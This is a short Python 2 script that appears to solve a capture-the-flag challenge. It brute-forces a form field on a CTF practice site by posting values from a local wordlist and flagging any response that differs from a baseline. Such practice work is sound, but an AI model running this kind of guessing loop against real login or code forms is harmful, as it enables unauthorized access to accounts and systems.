#coding:utf-8
import requests

hea = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0',
        'Accept-Encoding':'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language' : 'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Referer': 'http://mengxin.ctfku.com:2333/pao.php',
        'Content-Type':'application/x-www-form-urlencoded'
       }
url='http://mengxin.ctfku.com:2333/pao.php'
data = {'num':123}
content = requests.post(url,data=data,headers=hea)
content.encoding='utf-8'
recv=content.text
passFile = open(r'C:\Users\Leticia\Desktop\mutou.txt')
for line in passFile.readlines():
    password = line.strip('\n')
    data = {'num':password}
    print 'trying',password
    content = requests.post(url,data=data)
    content.encoding='utf-8'
    html=content.text
    if html != recv:
        print html
